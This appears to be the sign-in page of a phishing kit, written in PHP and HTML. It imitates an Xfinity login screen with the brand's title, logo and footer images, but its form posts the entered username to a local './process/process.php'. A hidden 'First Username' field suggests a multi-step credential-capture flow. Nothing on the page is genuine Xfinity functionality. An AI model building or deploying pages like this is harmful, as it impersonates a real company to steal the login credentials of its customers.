<?php
    require './includes.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Xfinity</title>
    <link rel="stylesheet" href="./assets/css/reset.css">
    <link rel="stylesheet" href="./assets/css/style.css">
    <link rel="shortcut icon" href="./assets/img/favicon.ico" type="image/x-icon">
</head>
<body>
    <div class="container-wrapper">
        <div class="left-index">&nbsp;</div>

        <div class="right-index">
            <div class="logo-div">
                <img src="./assets/img/logo-grey.svg" class="logo-top" alt="">
            </div>
            <div>
                <p class="top-header">
                    Sign in with your Xfinity ID
                </p>
            </div>

            <form action="./process/process.php" autocapitalize="off" autocomplete="off" method="post">
                <input type="text" required value="First Username" name="form_name" id="form_name" class="hidden" hidden>
                <div>
                    <input type="text" data-length="1" class="input" required name="username" placeholder="Email, mobile, or username" id="username">
                </div>

                <p class="para-reg">
                    By signing in, you agree to our <span class="link">Terms of Service</span> and <span class="link">Privacy Policy</span>.
                </p>

                <div>
                    <button type="submit" class="letsgo-button">Let's go</button>
                </div>
            </form>

            <div>
                <div class="redirects">
                    <p>
                        New to Xfinity? View exclusive offers near you
                    </p>

                    <span class="resources-middle-div"></span>

                    <svg width="1.5rem" height="1.5rem" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M7.17001 13.8674L6.39001 13.0724L10.44 8.99243L6.39001 4.90493L7.17001 4.11743L12.015 8.99243L7.17001 13.8674Z" fill="#6E6E70"/>
                    </svg>
                </div>
                <div class="redirects">
                    <p>
                        Find your Xfinity ID
                    </p>

                    <span class="resources-middle-div"></span>

                    <svg width="1.5rem" height="1.5rem" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M7.17001 13.8674L6.39001 13.0724L10.44 8.99243L6.39001 4.90493L7.17001 4.11743L12.015 8.99243L7.17001 13.8674Z" fill="#6E6E70"/>
                    </svg>
                </div>
                <div style="border: none;" class="redirects">
                    <p>
                        Create a new Xfinity ID
                    </p>

                    <span class="resources-middle-div"></span>

                    <svg width="1.5rem" height="1.5rem" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M7.17001 13.8674L6.39001 13.0724L10.44 8.99243L6.39001 4.90493L7.17001 4.11743L12.015 8.99243L7.17001 13.8674Z" fill="#6E6E70"/>
                    </svg>
                </div>
            </div>
        </div>
    </div>

    <div class="footer-container">
        <img src="./assets/img/footer.png" class="footer-sm" alt="">
        <img src="./assets/img/footer-md.png" class="footer-md" alt="">
        <img src="./assets/img/footer-lg.png" class="footer-lg" alt="">

        <div class="cmp-revoke">
            <button class="cmp-revoke-consent" id="cmp-revoke">
            Cookie Preferences</button>
        </div>

    </div>

    <script>
        const form = document.querySelector('form');

        form.addEventListener('submit', event => {
            // Get all the buttons on the page
            const buttons = document.querySelectorAll('button');

            // Loop through the buttons and set their disabled attribute to true
            buttons.forEach(button => {
                button.disabled = true;
            });
        });
    </script>
</body>
</html>
